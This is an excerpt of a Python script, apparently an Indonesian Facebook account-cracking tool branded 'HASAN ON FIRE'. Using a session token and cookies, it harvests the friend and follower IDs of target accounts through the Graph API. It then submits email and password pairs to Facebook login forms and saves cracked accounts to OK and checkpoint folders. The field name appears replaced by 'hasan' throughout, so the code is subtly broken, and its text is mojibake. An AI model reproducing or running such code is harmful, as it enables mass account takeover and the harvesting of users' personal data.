...
def logo(n):
	return str(f"""
   â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
...
â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
   ...
   \033[1;96m ðŸ’” HASAN ON FIRE ðŸ’”
                 Stetus- Trail{H}â€¢{K}â€¢{M}â€¢""")   
def logo2():
	return str(f"""
   
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ”€
â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
...
def get_data():
	try:
		...
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['hasan'].split(' ')[0].lower()
		menu(n,t,c)
...
def cek_akun():
	...
	try:
		...
		for data in uuid:
			...
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['hasan']
...
def cek_HASAN():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] cek HASANðŸ”¥ akun ok\n [{hh}2{P}] cek HASANðŸ’” akun cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}>{P}] tidak HASANðŸ”¥ ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
		...
		except:sys.exit(f" [{M}>{P}] file tidak ada HASANðŸ”¥ ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
...
def crack_publik(t,c):
	...
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,hasan,userhasan)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['userhasan']+'|'+pi['hasan'])
				except:dump.append(pi['id']+'|'+pi['hasan'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
...
def crack_masal(t,c):
    ...
    for bz in range(apa):
    	...
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(hasan,userhasan,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['userhasan']+'|'+pi['hasan'])
    		      except:dump.append(pi['id']+'|'+pi['hasan'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
...
def crack_foll(t,c):
	...
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=hasan,subscribers.fields(id,userhasan,hasan).limit(1000000000)&access_token={t}",cookies=c).json()
...
def sesi(res):
	...
	data = {x.get('hasan'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		data2 = {x.get('hasan'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
	...
	try:
		...
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('hasan="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('hasan="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
